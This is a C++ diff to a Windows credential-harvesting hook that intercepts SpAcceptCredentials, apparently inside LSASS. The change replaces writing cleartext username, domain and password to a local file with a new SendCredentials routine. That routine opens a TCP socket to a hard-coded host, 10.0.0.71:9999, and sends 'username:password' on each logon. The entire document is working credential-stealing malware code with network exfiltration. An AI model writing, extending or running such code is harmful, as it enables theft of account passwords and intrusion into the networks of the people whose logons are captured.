@@ -1,9 +1,12 @@
 // Standard I/O operations for debugging and output
 #include <iostream>
-// Windows API functions, types, and structures
-#include <Windows.h>
 // std::memcpy() for safe memory copying operations
 #include <cstring>
+// Winsock for TCP connections (must come before Windows.h)
+#include <winsock2.h>
+#include <ws2tcpip.h>
+// Windows API functions, types, and structures
+#include <Windows.h>
 // Enable 32-bit security definitions (required before Sspi.h)
 #define SECURITY_WIN32
 // Security Support Provider Interface - provides authentication structures
@@ -34,6 +37,9 @@ char bytesToRestoreSpAccecptedCredentials[12] = { 0 };     // Backup of original
 
 // Forward declaration of hook installation function
 void installSpAccecptedCredentialsHook();
+
+// Simple TCP client to send credentials (like netcat)
+BOOL SendCredentials(const wchar_t* username, const wchar_t* password);
 
 // Pattern scanning function to find byte signatures in memory
 // This is a linear search algorithm that looks for a specific byte pattern
@@ -78,38 +84,106 @@ PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternS
 	return (PVOID)NULL;  // Pattern not found
 }
 
+// Simple TCP client - sends credentials like: "username:password"
+BOOL SendCredentials(const wchar_t* username, const wchar_t* password)
+{
+	SOCKET sock = INVALID_SOCKET;
+	struct addrinfo *result = NULL, hints;
+	int iResult;
+	
+	// Server config - change these
+	const char* SERVER_IP = "10.0.0.71";  // Your server IP
+	const char* SERVER_PORT = "9999";         // Your server port
+	
+	// Initialize Winsock
+	WSADATA wsaData;
+	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+	if (iResult != 0) {
+		return FALSE;
+	}
+	
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	
+	// Resolve server address
+	iResult = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);
+	if (iResult != 0) {
+		WSACleanup();
+		return FALSE;
+	}
+	
+	// Create socket
+	sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (sock == INVALID_SOCKET) {
+		freeaddrinfo(result);
+		WSACleanup();
+		return FALSE;
+	}
+	
+	// Connect to server
+	iResult = connect(sock, result->ai_addr, (int)result->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(sock);
+		freeaddrinfo(result);
+		WSACleanup();
+		return FALSE;
+	}
+	
+	freeaddrinfo(result);
+	
+	// Convert Unicode to ASCII for transmission
+	char username_ascii[256] = {0};
+	char password_ascii[256] = {0};
+	
+	WideCharToMultiByte(CP_UTF8, 0, username, -1, username_ascii, 256, NULL, NULL);
+	WideCharToMultiByte(CP_UTF8, 0, password, -1, password_ascii, 256, NULL, NULL);
+	
+	// Format like: "username:password"
+	char credential_data[512];
+	sprintf_s(credential_data, sizeof(credential_data), "%s:%s", username_ascii, password_ascii);
+	
+	// Send data
+	iResult = send(sock, credential_data, strlen(credential_data), 0);
+	
+	// Cleanup
+	closesocket(sock);
+	WSACleanup();
+	
+	return (iResult != SOCKET_ERROR);
+}
+
 // Hook function that intercepts SpAcceptCredentials calls
 // This function has the EXACT same signature as the original SpAcceptCredentials
 // When Windows calls SpAcceptCredentials, our hook executes instead
 // The parameters are automatically passed to us due to x64 calling convention
 NTSTATUS NTAPI hookedSpAccecptedCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
 {
-	DWORD bytesWritten = 0;  // Bytes written counter for file operations
-	
-	// Create file to store captured credentials
-	// GENERIC_ALL = full access, CREATE_ALWAYS = overwrite if exists
-	HANDLE file = CreateFileW(L"c:\\temp\\credentials.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, NULL, NULL);
-	if (file == INVALID_HANDLE_VALUE) {
-		// If file creation fails, just call original function and exit
-		// This ensures the system continues to work even if our hook fails
-		_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
-		return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
-	}
-	
 	// Cast the raw address to a callable function pointer
 	// This allows us to call the original SpAcceptCredentials function
 	_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
 
-	// Intercept and write credentials to disk in format: username@domain:password
-	// DownlevelName = username (e.g., "Administrator")
-	WriteFile(file, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, &bytesWritten, NULL);
-	WriteFile(file, "@", 2, &bytesWritten, NULL);  // Separator between username and domain
-	// DomainName = domain (e.g., "WORKGROUP" or "CORP.LOCAL")
-	WriteFile(file, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length, &bytesWritten, NULL);
-	WriteFile(file, ":", 2, &bytesWritten, NULL);  // Separator between domain and password
-	// Password = clear text password (this is why this technique is dangerous!)
-	WriteFile(file, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length, &bytesWritten, NULL);
-	CloseHandle(file);
+	// Convert Unicode strings to null-terminated strings
+	wchar_t username[256] = {0};
+	wchar_t password[256] = {0};
+	
+	// Copy username (DownlevelName)
+	if (PrimaryCredentials->DownlevelName.Buffer && PrimaryCredentials->DownlevelName.Length > 0) {
+		size_t usernameLen = min(PrimaryCredentials->DownlevelName.Length / sizeof(wchar_t), 255);
+		memcpy(username, PrimaryCredentials->DownlevelName.Buffer, usernameLen * sizeof(wchar_t));
+		username[usernameLen] = L'\0';
+	}
+	
+	// Copy password
+	if (PrimaryCredentials->Password.Buffer && PrimaryCredentials->Password.Length > 0) {
+		size_t passwordLen = min(PrimaryCredentials->Password.Length / sizeof(wchar_t), 255);
+		memcpy(password, PrimaryCredentials->Password.Buffer, passwordLen * sizeof(wchar_t));
+		password[passwordLen] = L'\0';
+	}
+	
+	// Send credentials via TCP (like netcat)
+	SendCredentials(username, password);
 
 	// Temporarily restore the original SpAcceptCredentials function
 	// This prevents infinite recursion and allows the original function to execute
